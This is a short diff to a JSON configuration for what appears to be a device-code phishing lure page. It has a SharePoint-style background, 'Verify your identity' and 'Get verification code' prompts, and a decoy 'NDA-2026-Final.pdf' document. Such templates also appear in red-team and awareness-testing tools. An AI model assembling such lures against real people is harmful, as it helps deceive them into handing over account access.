@@ -3,8 +3,36 @@
   "preload": true,
   "auth_mode": "devicecode",
   "fields": [
-    { "key": "file_name", "label": "File Name", "type": "text", "default": "Company_Policy.pdf" },
-    { "key": "pages", "label": "Pages", "type": "number", "default": 12 }
+    {
+      "key": "title",
+      "label": "Page Title",
+      "type": "text",
+      "default": "Verify your identity"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "Generate a one-time passcode to securely access your document."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "NDA-2026-Final.pdf"
+    },
+    {
+      "key": "pages",
+      "label": "Pages",
+      "type": "number",
+      "default": 4
+    }
   ],
   "background": {
     "default": "sharepoint_bg.jpg",
